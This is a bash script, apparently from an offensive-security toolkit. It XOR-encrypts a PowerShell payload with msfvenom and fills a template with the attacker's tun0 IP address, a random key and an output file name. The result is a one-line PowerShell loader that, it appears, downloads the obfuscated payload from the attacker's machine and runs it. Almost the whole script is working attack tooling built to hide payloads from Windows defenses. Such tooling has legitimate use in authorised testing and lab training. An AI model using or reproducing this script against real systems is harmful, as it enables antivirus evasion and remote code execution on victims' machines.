#!/usr/bin/env bash



current_dir=$(dirname $(readlink -f $0))

IP=$(ip a show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
KEY=$(openssl rand -base64 32 | tr -d '/=+[0-9]' | cut -c -25)
INFILE="/mnt/hgfs/Shared_Folder/Verified/ps/$1"
OUTFILE="$KEY.obf"

if [ "${INFILE: -4}" == ".ps1" ] || [ "${INFILE: -4}" == ".txt" ]; then
    # remove BOM using sed as PowerShell is allergic to it and will not execute our code if it's still there 
    msfvenom -p - --encrypt xor --encrypt-key "$KEY" -a x64 --platform windows -f raw < <(sed '1s/^\xEF\xBB\xBF//' < "$INFILE") >"/mnt/hgfs/Shared_Folder/Verified/ps_obf/$OUTFILE"
else
    msfvenom -p - --encrypt xor --encrypt-key "$KEY" -a x64 --platform windows -f raw <"$INFILE" >"/mnt/hgfs/Shared_Folder/Verified/ps_obf/$OUTFILE"
fi

echo -e "\n# $1"
sed -e "s/KALIIP/$IP/" \
    -e "s/KEY/$KEY/g" \
    -e "s/OUTFILE/$OUTFILE/" \
    "$current_dir/xor-template.ps1" \
| tr -d '\n'